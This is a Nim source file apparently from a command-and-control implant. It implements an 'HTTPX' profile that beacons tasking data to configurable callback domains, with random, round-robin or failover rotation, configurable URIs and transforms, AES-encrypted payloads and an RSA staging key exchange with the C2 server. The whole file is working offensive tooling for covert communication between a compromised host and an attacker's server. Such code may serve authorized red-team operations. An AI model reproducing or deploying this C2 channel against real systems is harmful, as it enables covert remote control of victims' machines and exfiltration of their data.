## HTTPX Profile - Advanced HTTP C2 communication with domain rotation and transforms
## Supports raw_c2_config with custom transforms, message locations, and failover

import std/[base64, strutils, json, random, os, httpclient, tables, strformat, uri]
import ../config
import ../utils/crypto
import ../utils/httpx_client
# Only import RSA if encrypted exchange is enabled at compile time
const encryptedExchange {.used.} = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import ../utils/rsa

type
  HttpxProfile* = ref object
    config: Config
    aesKey: seq[byte]
    rawC2Config: JsonNode
    callbackDomains: seq[string]
    domainRotation: string
    failoverThreshold: int
    currentDomainIndex: int

proc newHttpxProfile*(): HttpxProfile =
  ## Create a new HTTPX profile with raw_c2_config support
  result = HttpxProfile()
  result.config = getConfig()
  result.currentDomainIndex = 0
  
  # Parse callback_domains from JSON array
  let domainsStr = static: getEnv("CALLBACK_DOMAINS", "[\"http://127.0.0.1\"]")
  try:
    let domainsJson = parseJson(domainsStr)
    result.callbackDomains = @[]
    for domain in domainsJson:
      result.callbackDomains.add(domain.getStr())
  except:
    result.callbackDomains = @["http://127.0.0.1"]
  
  # Get domain rotation strategy
  result.domainRotation = static: getEnv("DOMAIN_ROTATION", "round-robin")
  
  # Get failover threshold
  let thresholdStr = static: getEnv("FAILOVER_THRESHOLD", "3")
  try:
    result.failoverThreshold = parseInt(thresholdStr)
  except:
    result.failoverThreshold = 3
  
  # Parse raw_c2_config
  let rawConfigStr = static: getEnv("RAW_C2_CONFIG", "")
  if rawConfigStr.len > 0:
    try:
      result.rawC2Config = parseJson(rawConfigStr)
    except:
      result.rawC2Config = newJNull()
  else:
    result.rawC2Config = newJNull()
  
  if result.config.debug:
    echo "[DEBUG] HTTPX Profile initialized"
    echo "[DEBUG] Callback domains: ", result.callbackDomains.join(", ")
    echo "[DEBUG] Domain rotation: ", result.domainRotation
    echo "[DEBUG] Failover threshold: ", result.failoverThreshold

proc selectDomain(profile: var HttpxProfile): string =
  ## Select domain based on rotation strategy
  case profile.domainRotation
  of "random":
    randomize()
    result = profile.callbackDomains[rand(profile.callbackDomains.len - 1)]
  of "round-robin":
    result = profile.callbackDomains[profile.currentDomainIndex]
    profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
  else: # fail-over
    result = profile.callbackDomains[profile.currentDomainIndex]

proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server using raw_c2_config with transforms
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  if profile.config.debug:
    echo "[DEBUG] === SENDING DATA VIA HTTPX ==="
    try:
      let jsonData = parseJson(data)
      if data.len < 2048:
        echo "[DEBUG] Request JSON:"
        echo jsonData.pretty()
      else:
        echo "[DEBUG] Request: Large payload (", data.len, " bytes)"
        if jsonData.hasKey("action"):
          echo "[DEBUG] Action: ", jsonData["action"].getStr()
    except:
      echo "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
  
  # Encrypt or encode payload
  var payload: string
  if profile.aesKey.len > 0 and callbackUuid.len > 0:
    if profile.config.debug:
      echo "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
    payload = encryptPayload(data, profile.aesKey, uuid)
  else:
    if profile.config.debug:
      echo "[DEBUG] Sending unencrypted payload (Base64 only)"
    payload = encode(uuid & data)
  
  # Use raw_c2_config if available
  if not profile.rawC2Config.isNil and profile.rawC2Config.kind != JNull:
    if profile.config.debug:
      echo "[DEBUG] Using raw_c2_config for HTTPX profile"
    
    # Get POST endpoint configuration
    if not profile.rawC2Config.hasKey("post"):
      if profile.config.debug:
        echo "[DEBUG] No POST endpoint in raw_c2_config"
      return ""
    
    let postConfig = profile.rawC2Config["post"]
    
    # Select URI from list
    if not postConfig.hasKey("uris") or postConfig["uris"].len == 0:
      if profile.config.debug:
        echo "[DEBUG] No URIs in POST endpoint"
      return ""
    
    randomize()
    let uri = postConfig["uris"][rand(postConfig["uris"].len - 1)].getStr()
    
    # Try domains based on rotation strategy
    var rawResponse: string
    case profile.domainRotation
    of "random", "round-robin":
      let baseUrl = profile.selectDomain()
      let fullUrl = baseUrl & uri
      try:
        rawResponse = httpxPost(fullUrl, payload, postConfig, profile.config.debug)
      except:
        if profile.config.debug:
          echo "[DEBUG] Request failed: ", getCurrentExceptionMsg()
        return ""
    
    else: # fail-over
      var attempts = 0
      for domain in profile.callbackDomains:
        let fullUrl = domain & uri
        var domainAttempts = 0
        while domainAttempts < profile.failoverThreshold:
          try:
            rawResponse = httpxPost(fullUrl, payload, postConfig, profile.config.debug)
            break
          except:
            if profile.config.debug:
              echo "[DEBUG] Attempt ", domainAttempts + 1, " failed for ", domain
            domainAttempts += 1
        if rawResponse.len > 0:
          break
        attempts += 1
      
      if rawResponse.len == 0:
        if profile.config.debug:
          echo "[DEBUG] All domains failed after failover attempts"
        return ""
    
    # Check if response is empty (e.g., from HTTP error like 502)
    if rawResponse.len == 0:
      if profile.config.debug:
        echo "[DEBUG] Empty response received (possibly HTTP error)"
      return ""
    
    # Decrypt or decode response after transforms have been reversed
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      if profile.config.debug:
        echo "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
      result = decryptPayload(rawResponse, profile.aesKey)
    else:
      if profile.config.debug:
        echo "[DEBUG] Decoding Base64 response"
      let decoded = decode(rawResponse)
      if decoded.len > 36:
        result = decoded[36..^1]
      else:
        result = ""
    
    return result
  
  else:
    # Fallback to simple HTTP POST (like basic HTTP profile)
    if profile.config.debug:
      echo "[DEBUG] No raw_c2_config, using fallback POST"
    
    let baseUrl = profile.selectDomain()
    let fullUrl = baseUrl & "/" & profile.config.postUri
    
    try:
      let client = newHttpClient()
      client.headers = newHttpHeaders({"User-Agent": profile.config.userAgent})
      result = client.postContent(fullUrl, payload)
      
      # Decrypt or decode response
      if profile.aesKey.len > 0 and callbackUuid.len > 0:
        result = decryptPayload(result, profile.aesKey)
      else:
        let decoded = decode(result)
        if decoded.len > 36:
          result = decoded[36..^1]
        else:
          result = ""
    except:
      if profile.config.debug:
        echo "[DEBUG] Fallback request failed: ", getCurrentExceptionMsg()
      return ""

proc close*(profile: var HttpxProfile) =
  ## Cleanup (no persistent connection for HTTP)
  discard

proc setAesKey*(profile: var HttpxProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc hasAesKey*(profile: HttpxProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var HttpxProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Same implementation as HTTP profile
  
  if not profile.config.encryptedExchange:
    if profile.config.debug:
      echo "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    return (true, "")
  
  when not encryptedExchange:
    if profile.config.debug:
      echo "[DEBUG] RSA not compiled in"
    return (true, "")
  
  when encryptedExchange:
    if not isRsaAvailable():
      if profile.config.debug:
        echo "[DEBUG] RSA key exchange not available: OpenSSL not found"
      return (true, "")
    
    if profile.config.debug:
      echo "[DEBUG] === PERFORMING RSA KEY EXCHANGE ==="
    
    try:
      var rsaKey = generateRsaKeyPair(4096)
      
      if not rsaKey.available:
        if profile.config.debug:
          echo "[DEBUG] RSA key generation failed"
        return (false, "")
      
      randomize()
      var sessionId = newString(20)
      for i in 0..19:
        sessionId[i] = char(rand(25) + ord('a'))
      
      let stagingMsg = %*{
        "action": "staging_rsa",
        "pub_key": encode(rsaKey.publicKeyPem),
        "session_id": sessionId
      }
      
      let response = profile.send($stagingMsg, profile.config.uuid)
      
      if response.len == 0:
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      let respJson = parseJson(response)
      
      if not respJson.hasKey("session_key") or not respJson.hasKey("uuid"):
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      let encryptedSessionKey = decode(respJson["session_key"].getStr())
      let newUuid = respJson["uuid"].getStr()
      
      let encryptedBytes = cast[seq[byte]](encryptedSessionKey)
      let decryptedKey = rsaPrivateDecrypt(rsaKey, encryptedBytes)
      
      if decryptedKey.len == 0:
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      var aesKey = decryptedKey
      if aesKey.len > 32:
        aesKey.setLen(32)
      
      profile.setAesKey(aesKey)
      freeRsaKeyPair(rsaKey)
      
      if profile.config.debug:
        echo "[DEBUG] RSA key exchange completed successfully"
      
      return (true, newUuid)
    
    except:
      if profile.config.debug:
        echo "[DEBUG] Key exchange exception: ", getCurrentExceptionMsg()
      return (false, "")
